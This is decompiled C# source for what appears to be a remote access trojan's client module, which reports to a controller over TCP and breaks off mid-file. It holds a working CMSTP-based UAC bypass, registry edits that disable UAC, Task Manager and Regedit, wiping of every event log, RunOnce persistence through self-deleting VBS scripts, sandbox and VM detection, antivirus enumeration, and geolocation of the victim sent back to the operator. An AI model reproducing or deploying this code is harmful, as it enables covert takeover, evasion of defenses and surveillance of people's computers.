using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x02000003 RID: 3
[StandardModule]
internal sealed class Functions
{
	// Token: 0x0600000E RID: 14 RVA: 0x00004A34 File Offset: 0x00002C34
	public static void uploadserialized(Stream stream, object message)
	{
		BinaryFormatter binaryFormatter = new BinaryFormatter();
		binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
		binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
		binaryFormatter.FilterLevel = TypeFilterLevel.Full;
		TcpClient client = Server.Client;
		lock (client)
		{
			if (Server.encryptedconnection & message is string)
			{
				message = EncryptionFunctions.PublicEncrypt(Conversions.ToString(message), "chizzy25@", Server.encryptionindex);
			}
			object objectValue = RuntimeHelpers.GetObjectValue(message);
			using (MemoryStream memoryStream = new MemoryStream())
			{
				binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
				ulong position = (ulong)memoryStream.Position;
				Server.Client.GetStream().Write(BitConverter.GetBytes(position), 0, 8);
				byte[] buffer = memoryStream.GetBuffer();
				Server.Client.GetStream().Write(buffer, 0, (int)position);
				memoryStream.Close();
				memoryStream.Dispose();
			}
		}
	}

	// Token: 0x0600000F RID: 15
	[DllImport("winmm.dll")]
	public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);

	// Token: 0x06000010 RID: 16
	[DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern IntPtr SendMessage(IntPtr hWnd, int hMsg, IntPtr wParam, IntPtr lParam);

	// Token: 0x06000011 RID: 17
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetCurrentHwProfile(IntPtr fProfile);

	// Token: 0x06000012 RID: 18
	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	// Token: 0x06000013 RID: 19
	[DllImport("user32.dll")]
	public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);

	// Token: 0x06000014 RID: 20
	[DllImport("urlmon.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int URLDownloadToFile([MarshalAs(UnmanagedType.IUnknown)] object pCaller, [MarshalAs(UnmanagedType.LPWStr)] string szURL, [MarshalAs(UnmanagedType.LPWStr)] string szFileName, int dwReserved, IntPtr lpfnCB);

	// Token: 0x06000015 RID: 21
	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string name);

	// Token: 0x06000016 RID: 22
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	// Token: 0x06000017 RID: 23
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	// Token: 0x06000018 RID: 24
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

	// Token: 0x06000019 RID: 25
	[DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
	public static extern IntPtr FindWindowEx2(IntPtr hWnd1, IntPtr hWnd2, IntPtr lpsz1, string lpsz2);

	// Token: 0x0600001A RID: 26
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	// Token: 0x0600001B RID: 27 RVA: 0x00004B30 File Offset: 0x00002D30
	public static void monitoron(bool turnon)
	{
		if (turnon)
		{
			Functions.SendMessage(new Form().Handle, 274, (IntPtr)61808, (IntPtr)(-1));
		}
		else
		{
			Functions.SendMessage(new Form().Handle, 274, (IntPtr)61808, (IntPtr)2);
		}
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00004B8C File Offset: 0x00002D8C
	public static void opencd(bool open)
	{
		if (open)
		{
			Functions.mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
		}
		else
		{
			Functions.mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
		}
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00004BB8 File Offset: 0x00002DB8
	public static void showtaskbar(bool show)
	{
		IntPtr hWnd = Functions.FindWindow("Shell_traywnd", "");
		if (show)
		{
			Functions.SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0, 64u);
		}
		else
		{
			Functions.SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0, 128u);
		}
	}

	// Token: 0x0600001E RID: 30 RVA: 0x00004C04 File Offset: 0x00002E04
	public static void showstartbtn(bool show)
	{
		IntPtr hWnd;
		if (!(Functions.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start") == IntPtr.Zero))
		{
			hWnd = Functions.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start");
		}
		else
		{
			hWnd = Functions.GetWindow(Functions.FindWindow("Shell_TrayWnd", null), 5u);
		}
		if (show)
		{
			Functions.ShowWindow(hWnd, 1);
		}
		else
		{
			Functions.ShowWindow(hWnd, 0);
		}
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00004C88 File Offset: 0x00002E88
	public static void startexplorer(bool start)
	{
		if (start)
		{
			Process.Start("explorer.exe");
		}
		else
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("taskkill", "/F /IM explorer.exe");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00004CD0 File Offset: 0x00002ED0
	public static void showclock(bool show)
	{
		IntPtr parentHandle = Functions.FindWindow("Shell_TrayWnd", null);
		IntPtr parentHandle2 = Functions.FindWindowEx(parentHandle, (IntPtr)0, "TrayNotifyWnd", null);
		IntPtr hWnd = Functions.FindWindowEx(parentHandle2, (IntPtr)0, "TrayClockWClass", null);
		if (show)
		{
			Functions.ShowWindow(hWnd, 1);
		}
		else
		{
			Functions.ShowWindow(hWnd, 0);
		}
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00004D24 File Offset: 0x00002F24
	public static void showtray(bool show)
	{
		IntPtr parentHandle = Functions.FindWindow("Shell_TrayWnd", null);
		IntPtr hWnd = Functions.FindWindowEx(parentHandle, (IntPtr)0, "TrayNotifyWnd", null);
		if (show)
		{
			Functions.ShowWindow(hWnd, 1);
		}
		else
		{
			Functions.ShowWindow(hWnd, 0);
		}
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00004D68 File Offset: 0x00002F68
	public static void showdesktopico(bool show)
	{
		long value = (long)Functions.FindWindowEx((IntPtr)0L, (IntPtr)0L, "Progman", null);
		if (show)
		{
			Functions.ShowWindow((IntPtr)value, 5);
		}
		else
		{
			Functions.ShowWindow((IntPtr)value, 0);
		}
	}

	// Token: 0x06000023 RID: 35 RVA: 0x00004DB4 File Offset: 0x00002FB4
	public static void hideallwindows()
	{
		foreach (Process process in Process.GetProcesses())
		{
			try
			{
				Functions.ShowWindow(process.Handle, 0);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000024 RID: 36 RVA: 0x00004E04 File Offset: 0x00003004
	public static void enabletaskmgr(bool show)
	{
		if (show)
		{
			Functions.ModifyRegDWORD("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", "0");
		}
		else
		{
			Functions.ModifyRegDWORD("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", "1");
		}
	}

	// Token: 0x06000025 RID: 37 RVA: 0x00004E2C File Offset: 0x0000302C
	public static void enableregedit(bool show)
	{
		if (show)
		{
			Functions.ModifyRegDWORD("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", "0");
		}
		else
		{
			Functions.ModifyRegDWORD("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", "1");
		}
	}

	// Token: 0x06000026 RID: 38 RVA: 0x00004E54 File Offset: 0x00003054
	public static void showmouse()
	{
		for (;;)
		{
			Point position = new Point(0, 0);
			Cursor.Position = position;
			Thread.Sleep(100);
		}
	}

	// Token: 0x06000027 RID: 39 RVA: 0x00004E78 File Offset: 0x00003078
	public static void disableuac()
	{
		Functions.ModifyRegDWORD("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA", "0");
	}

	// Token: 0x06000028 RID: 40 RVA: 0x00004E8C File Offset: 0x0000308C
	public static void DeleteEvents()
	{
		foreach (EventLog eventLog in EventLog.GetEventLogs())
		{
			try
			{
				eventLog.Clear();
				eventLog.Dispose();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000029 RID: 41 RVA: 0x00004EDC File Offset: 0x000030DC
	public static void GeoLocate()
	{
		try
		{
			string text = "https://whatismyipaddress.com/update-location";
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
			NewLateBinding.LateSet(objectValue, null, "Width", new object[]
			{
				250
			}, null, null);
			NewLateBinding.LateSet(objectValue, null, "Height", new object[]
			{
				135
			}, null, null);
			NewLateBinding.LateSet(objectValue, null, "Top", new object[]
			{
				0
			}, null, null);
			NewLateBinding.LateSet(objectValue, null, "Left", new object[]
			{
				0
			}, null, null);
			object instance = objectValue;
			Type type = null;
			string memberName = "Navigate";
			object[] array = new object[]
			{
				text
			};
			object[] arguments = array;
			string[] argumentNames = null;
			Type[] typeArguments = null;
			bool[] array2 = new bool[]
			{
				true
			};
			NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
			if (array2[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			while (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, null, "ReadyState", new object[0], null, null, null), 4, false))
			{
				Application.DoEvents();
			}
			NewLateBinding.LateSet(objectValue, null, "Visible", new object[]
			{
				false
			}, null, null);
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Document", new object[0], null, null, null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "body", new object[0], null, null, null), null, "innerHTML", new object[0], null, null, null), null, "Split", new object[]
			{
				new string[]
				{
					"<td id=\"map1_lat\"></td>"
				},
				StringSplitOptions.None
			}, null, null, null), new object[]
			{
				1
			}, null));
			string text2 = Conversions.ToString(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(objectValue3, null, "Split", new object[]
			{
				new string[]
				{
					"<td></td>"
				},
				StringSplitOptions.None
			}, null, null, null), new object[]
			{
				0
			}, null));
			text2 = text2.Replace("<td>", "");
			text2 = Regex.Replace(text2, "\\t|\\n|\\r", "");
			text2 = text2.Replace("</td>", ",");
			object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "body", new object[0], null, null, null), null, "innerHTML", new object[0], null, null, null), null, "Split", new object[]
			{
				new string[]
				{
					"<td id=\"map1_lng\"></td>"
				},
				StringSplitOptions.None
			}, null, null, null), new object[]
			{
				1
			}, null));
			string text3 = Conversions.ToString(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(objectValue4, null, "Split", new object[]
			{
				new string[]
				{
					"<td></td>"
				},
				StringSplitOptions.None
			}, null, null, null), new object[]
			{
				0
			}, null));
			text3 = text3.Replace("<td>", "");
			text3 = Regex.Replace(text3, "\\t|\\n|\\r", "");
			text3 = text3.Replace("</td>", ",");
			Functions.uploadserialized(Server.nstream, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("38|", Functions.CoordsToAddress(text2.Split(new char[]
			{
				','
			})[1], text3.Split(new char[]
			{
				','
			})[1])), " "), text2.Split(new char[]
			{
				','
			})[1]), ", "), text3.Split(new char[]
			{
				','
			})[1]));
			NewLateBinding.LateCall(objectValue, null, "Quit", new object[0], null, null, null, true);
		}
		catch (Exception ex)
		{
			Functions.uploadserialized(Server.nstream, "38|Failed!");
			try
			{
				object objectValue;
				NewLateBinding.LateCall(objectValue, null, "Quit", new object[0], null, null, null, true);
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x0600002A RID: 42 RVA: 0x000053A4 File Offset: 0x000035A4
	public static object CoordsToAddress(string lat, string lng)
	{
		object result;
		try
		{
			string text = "http://geocoder.ca/?locate=" + lat + "+" + lng;
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
			NewLateBinding.LateSet(objectValue, null, "Width", new object[]
			{
				250
			}, null, null);
			NewLateBinding.LateSet(objectValue, null, "Height", new object[]
			{
				135
			}, null, null);
			NewLateBinding.LateSet(objectValue, null, "Top", new object[]
			{
				0
			}, null, null);
			NewLateBinding.LateSet(objectValue, null, "Left", new object[]
			{
				0
			}, null, null);
			object instance = objectValue;
			Type type = null;
			string memberName = "Navigate";
			object[] array = new object[]
			{
				text
			};
			object[] arguments = array;
			string[] argumentNames = null;
			Type[] typeArguments = null;
			bool[] array2 = new bool[]
			{
				true
			};
			NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
			if (array2[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			while (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, null, "ReadyState", new object[0], null, null, null), 4, false))
			{
				Application.DoEvents();
			}
			NewLateBinding.LateSet(objectValue, null, "Visible", new object[]
			{
				false
			}, null, null);
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Document", new object[0], null, null, null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue2, null, "body", new object[0], null, null, null), null, "innerHTML", new object[0], null, null, null), null, "Split", new object[]
			{
				new string[]
				{
					"This is the nearest street address. [ <a href=\"https://geocoder.ca/?locate="
				},
				StringSplitOptions.None
			}, null, null, null), new object[]
			{
				1
			}, null));
			string text2 = Conversions.ToString(NewLateBinding.LateIndexGet(NewLateBinding.LateGet(objectValue3, null, "Split", new object[]
			{
				new string[]
				{
					"\">"
				},
				StringSplitOptions.None
			}, null, null, null), new object[]
			{
				0
			}, null));
			NewLateBinding.LateCall(objectValue, null, "Quit", new object[0], null, null, null, true);
			result = text2;
		}
		catch (Exception ex)
		{
			try
			{
				object objectValue;
				NewLateBinding.LateCall(objectValue, null, "Quit", new object[0], null, null, null, true);
			}
			catch (Exception ex2)
			{
			}
		}
		return result;
	}

	// Token: 0x0600002B RID: 43 RVA: 0x0000568C File Offset: 0x0000388C
	public static object LoadProcesses()
	{
		string text = "";
		foreach (Process process in Process.GetProcesses())
		{
			try
			{
				text = text + process.ProcessName + ",";
				try
				{
					text = text + Functions.GetMainModuleFileName(process, 1024) + ",";
				}
				catch (Exception ex)
				{
					try
					{
						text += process.MainModule.FileName;
					}
					catch (Exception ex2)
					{
						text += " ,";
					}
				}
				text = text + Conversions.ToString(process.Id) + "|";
			}
			catch (Exception ex3)
			{
			}
		}
		return text;
	}

	// Token: 0x0600002C RID: 44
	[DllImport("Kernel32.dll")]
	private static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In] [Out] ref uint lpdwSize);

	// Token: 0x0600002D RID: 45 RVA: 0x00005774 File Offset: 0x00003974
	public static string GetMainModuleFileName(Process process, int buffer = 1024)
	{
		object obj = new StringBuilder(buffer);
		uint num = (uint)((ulong)Conversions.ToUInteger(NewLateBinding.LateGet(obj, null, "Capacity", new object[0], null, null, null)) + 1UL);
		if (Functions.QueryFullProcessImageName(process.Handle, 0u, (StringBuilder)obj, ref num))
		{
			return obj.ToString();
		}
		return "No Path";
	}

	// Token: 0x0600002E RID: 46 RVA: 0x000057CC File Offset: 0x000039CC
	public static string userrole()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		string result = string.Empty;
		if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			result = "User";
		}
		else
		{
			result = "Admin";
		}
		return result;
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00005808 File Offset: 0x00003A08
	public static string AVName()
	{
		string result;
		try
		{
			string text = string.Empty;
			try
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(Functions.getOSInfo().Contains("XP"), "", "2").ToString(), "SELECT * FROM AntiVirusProduct").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text += managementObject["displayName"].ToString();
				}
			}
			finally
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator;
				if (enumerator != null)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				result = text;
			}
			else
			{
				result = "No Antivirus";
			}
		}
		catch (Exception ex)
		{
			result = "No Antivirus";
		}
		return result;
	}

	// Token: 0x06000030 RID: 48 RVA: 0x000058E0 File Offset: 0x00003AE0
	public static object CPUName()
	{
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from win32_processor");
		string result = string.Empty;
		try
		{
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = Conversions.ToString(managementObject["Name"]);
			}
		}
		finally
		{
			ManagementObjectCollection.ManagementObjectEnumerator enumerator;
			if (enumerator != null)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		return result;
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00005954 File Offset: 0x00003B54
	public static object GPUName()
	{
		string result = string.Empty;
		try
		{
			SelectQuery query = new SelectQuery("Win32_VideoController");
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(query);
			try
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator();
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					result = managementObject["Caption"].ToString();
				}
			}
			finally
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator;
				if (enumerator != null)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
		}
		catch (ManagementException ex)
		{
		}
		return result;
	}

	// Token: 0x06000032 RID: 50 RVA: 0x000059F0 File Offset: 0x00003BF0
	public static object HWID()
	{
		IntPtr intPtr = Marshal.AllocHGlobal(123);
		Functions.HWProfile hwprofile = new Functions.HWProfile();
		Marshal.StructureToPtr<Functions.HWProfile>(hwprofile, intPtr, false);
		string result = string.Empty;
		if (Functions.GetCurrentHwProfile(intPtr))
		{
			Marshal.PtrToStructure<Functions.HWProfile>(intPtr, hwprofile);
			result = hwprofile.szHwProfileGuid.ToString();
		}
		return result;
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00005A38 File Offset: 0x00003C38
	public static object getMacAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		return allNetworkInterfaces[0].GetPhysicalAddress().ToString();
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00005A58 File Offset: 0x00003C58
	public static string getOSInfo()
	{
		OperatingSystem osversion = Environment.OSVersion;
		Version version = osversion.Version;
		string text = "";
		if (osversion.Platform == PlatformID.Win32Windows)
		{
			int minor = version.Minor;
			if (minor == 0)
			{
				text = "95";
			}
			else if (minor == 10)
			{
				if (Operators.CompareString(version.Revision.ToString(), "2222A", false) == 0)
				{
					text = "98SE";
				}
				else
				{
					text = "98";
				}
			}
			else if (minor == 90)
			{
				text = "Me";
			}
		}
		else if (osversion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				if (version.Minor == 0)
				{
					text = "2000";
				}
				else
				{
					text = "XP";
				}
				break;
			case 6:
				if (version.Minor == 0)
				{
					text = "Vista";
				}
				else if (version.Minor == 1)
				{
					text = "7";
				}
				else
				{
					text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", null));
				}
				break;
			}
		}
		if (Operators.CompareString(text, "", false) != 0)
		{
			if (text.ToLower().Contains("windows"))
			{
				text = text;
			}
			else
			{
				text = "Windows " + text;
			}
			if (Operators.CompareString(osversion.ServicePack, "", false) != 0)
			{
				text = text + " " + osversion.ServicePack;
			}
		}
		return text;
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00005BCC File Offset: 0x00003DCC
	public static void ElevateSelfStartup()
	{
		try
		{
			Functions.UACB(Process.GetCurrentProcess().MainModule.FileName, false);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00005C0C File Offset: 0x00003E0C
	public static void ElevateSelf()
	{
		Functions.UACB(Process.GetCurrentProcess().MainModule.FileName, true);
	}

	// Token: 0x06000037 RID: 55 RVA: 0x00005C24 File Offset: 0x00003E24
	public static void UACB(string filename, bool connected)
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
				if (!directoryInfo.Exists)
				{
					directoryInfo.Create();
				}
				FileInfo fileInfo = new FileInfo(Path.Combine(directoryInfo.FullName, "CMSTP.inf"));
				string value = "\r\n        [version]\r\n        Signature=$chicago$\r\n        AdvancedINF=2.5\r\n        [DefaultInstall]\r\n        CustomDestination=CustInstDestSectionAllUsers\r\n        RunPreSetupCommands=RunPreSetupCommandsSection\r\n        [RunPreSetupCommandsSection]\r\n        powershell.exe \"Start-Process '" + filename + "' -Verb RunAs\"\r\n        taskkill /IM cmstp.exe /F\r\n        [CustInstDestSectionAllUsers]\r\n        49000,49001=AllUSer_LDIDSection, 7\r\n        [AllUSer_LDIDSection]\r\n        \"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n        [Strings]\r\n        ServiceName=\"CMMGR32\"\r\n        ShortSvcName=\"CMMGR32\"";
				using (FileStream fileStream = fileInfo.Create())
				{
					using (BinaryWriter binaryWriter = new BinaryWriter(fileStream, Encoding.ASCII))
					{
						binaryWriter.Write(value);
						fileStream.Flush();
					}
				}
				string value2 = string.Concat(new string[]
				{
					"on error resume next\r\nCreateObject(\"Wscript.Shell\").Run \"",
					Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe"),
					" /au ",
					fileInfo.FullName,
					"\"\r\nCreateObject(\"Scripting.FileSystemObject\").DeleteFile WScript.ScriptFullName"
				});
				TextWriter textWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Junction.vbs");
				textWriter.Write(value2);
				textWriter.Close();
				Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Junction.vbs");
				int num = 0;
				while (Process.GetProcessesByName("cmstp").Length <= 0)
				{
					Thread.Sleep(100);
					num++;
					if (num > 15)
					{
						break;
					}
				}
				Thread.Sleep(500);
				SendKeys.SendWait("{ENTER}");
				Server.objMutex.Close();
				Server.objMutex = null;
				if (connected)
				{
					Functions.uploadserialized(Server.nstream, "Elevate|Success");
				}
				Process.GetCurrentProcess().Kill();
				return;
			}
			catch (Exception ex)
			{
				if (connected)
				{
					Functions.uploadserialized(Server.nstream, "Elevate|Failure");
				}
				return;
			}
		}
		if (connected)
		{
			Functions.uploadserialized(Server.nstream, "Elevate|Admin");
		}
	}

	// Token: 0x06000038 RID: 56 RVA: 0x00005E58 File Offset: 0x00004058
	public static void AddStartup(string name, string tpath)
	{
		if (!File.Exists(Interaction.Environ("localappdata") + "\\Execution.vbs"))
		{
			string value = string.Concat(new string[]
			{
				"on error resume next\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\",
				name,
				"\", \"",
				tpath,
				"\"\r\nset filesys = CreateObject(\"Scripting.FileSystemObject\")\r\nfilesys.CopyFile\"",
				Process.GetCurrentProcess().MainModule.FileName,
				"\", \"",
				tpath,
				"\"\r\nHiddenStartfilesys.DeleteFile WScript.ScriptFullName"
			});
			TextWriter textWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution.vbs");
			textWriter.Write(value);
			textWriter.Close();
		}
		Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Execution.vbs");
	}

	// Token: 0x06000039 RID: 57 RVA: 0x00005F1C File Offset: 0x0000411C
	public static void ModifyRegDWORD(string keypath, string value)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution3.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution3.vbs");
		}
		string value2 = string.Concat(new string[]
		{
			"on error resume next\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"",
			keypath,
			"\", \"",
			value,
			"\", \"REG_DWORD\"\r\nfilesys.DeleteFile WScript.ScriptFullName"
		});
		TextWriter textWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution3.vbs");
		textWriter.Write(value2);
		textWriter.Close();
		Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Execution3.vbs");
	}

	// Token: 0x0600003A RID: 58 RVA: 0x00005FD4 File Offset: 0x000041D4
	public static void ModifyRegString(string keypath, string value)
	{
		if (File.Exists(Interaction.Environ("localappdata") + "\\Execution4.vbs"))
		{
			File.Delete(Interaction.Environ("localappdata") + "\\Execution4.vbs");
		}
		string value2 = string.Concat(new string[]
		{
			"on error resume next\r\nset wshShell = CreateObject( \"WScript.Shell\" )\r\nwshShell.RegWrite \"",
			keypath,
			"\", \"",
			value,
			"\"\r\nfilesys.DeleteFile WScript.ScriptFullName"
		});
		TextWriter textWriter = new StreamWriter(Interaction.Environ("localappdata") + "\\Execution4.vbs");
		textWriter.Write(value2);
		textWriter.Close();
		Process.Start("explorer.exe", Interaction.Environ("localappdata") + "\\Execution4.vbs");
	}

	// Token: 0x0600003B RID: 59 RVA: 0x0000608C File Offset: 0x0000428C
	public static object Unblock()
	{
		return Functions.DeleteFile(Process.GetCurrentProcess().MainModule.FileName + Convert.ToString(":Zone.Identifier"));
	}

	// Token: 0x0600003C RID: 60
	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	// Token: 0x0600003D RID: 61 RVA: 0x000060C4 File Offset: 0x000042C4
	public static bool Sandboxie()
	{
		bool result;
		try
		{
			if ((int)Functions.GetModuleHandle("SbieDll.dll") != 0)
			{
				result = true;
			}
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x0600003E RID: 62 RVA: 0x0000610C File Offset: 0x0000430C
	public static bool isVM()
	{
		bool result;
		try
		{
			if (File.Exists(Path.GetTempPath() + "ms.ini"))
			{
				result = false;
			}
			else
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
				string str = string.Empty;
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						str = Convert.ToString(RuntimeHelpers.GetObjectValue(managementObject["Description"]));
						string text = Strings.StrConv(str, VbStrConv.Lowercase, 0);
						if (text.Contains("virtual"))
						{
							return true;
						}
						if (text.Contains("vmware"))
						{
							return true;
						}
						if (text.Contains("parallel"))
						{
							return true;
						}
						if (text.Contains("vm additions"))
						{
							return true;
						}
						if (text.Contains("remotefx"))
						{
							return true;
						}
						if (text.Contains("generic"))
						{
							return true;
						}
						if (text.Contains("cirrus logic"))
						{
							return true;
						}
						if (text.Contains("standard vga"))
						{
							return true;
						}
						if (text.Contains("matrox"))
						{
							return true;
						}
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				result = false;
			}
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600003F RID: 63 RVA: 0x000062A0 File Offset: 0x000044A0
	public static void killprocessbyname(string name)
	{
		try
		{
			foreach (Process process in Process.GetProcessesByName(name))
			{
				process.Kill();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000040 RID: 64 RVA: 0x000062EC File Offset: 0x000044EC
